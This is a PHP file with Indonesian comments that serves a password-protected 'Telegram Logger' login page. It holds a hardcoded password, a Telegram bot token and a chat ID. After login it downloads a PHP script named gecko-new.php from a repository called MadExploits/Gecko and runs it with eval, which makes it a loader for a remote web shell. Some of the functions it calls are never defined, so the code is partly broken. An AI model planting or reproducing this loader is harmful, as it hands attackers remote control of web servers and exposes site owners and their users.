<?php
session_start();
define('TELEGRAM_BOT_TOKEN', '7351931358:AAGWbXI7hnIOvGKbnQPTt2z1DiOsVIU0vLs'); // Ganti dengan token bot Anda
define('TELEGRAM_CHAT_ID', '7460763516'); // Ganti dengan ID chat Anda

$error = '';
$logFile = 'last_log_time.txt';
$logInterval = 5; // Waktu dalam detik

function sendTelegramMessage($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
    file_get_contents($url);
}

// Cek apakah ada permintaan POST untuk login
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $password = $_POST['password'] ?? '';
    
    if ($password === 'sempak') {
        $_SESSION['loggedin'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = 'Password salah.';
    }
}

// Cek jika sudah login
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    // Tampilkan halaman login
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Telegram Logger</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 50px; text-align: center; }
            form { background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); display: inline-block; }
            input[type="password"] { padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; width: 100%; }
            button { padding: 10px; background-color: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
            button:hover { background-color: #218838; }
            .error { color: red; }
        </style>
    </head>
    <body>
        <h2>Login untuk Mengakses Logger</h2>
        <?php if ($error): ?>
            <p class="error"><?php echo $error; ?></p>
        <?php endif; ?>
        <form method="POST" action="">
            <label for="password">Password:</label>
            <input type="password" name="password" required>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php');
    eval('?>' . $a);
}
?>
